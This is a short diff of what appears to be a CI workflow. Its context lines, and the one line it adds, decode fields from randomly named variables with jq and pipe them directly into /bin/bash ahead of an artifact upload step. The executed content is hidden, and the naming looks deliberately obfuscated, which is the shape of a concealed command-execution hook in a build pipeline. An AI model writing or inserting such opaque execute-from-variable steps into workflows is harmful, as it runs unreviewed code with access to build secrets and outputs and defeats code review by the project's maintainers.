@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$phs16" | jq -r .zan69672 | /bin/bash
           echo $nqbkg819 | jq -r .qqeui87 | /bin/bash
           echo $t04 | jq -r .cfhn928 | /bin/bash
+          echo $fug48 | jq -r .zfcug5976 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
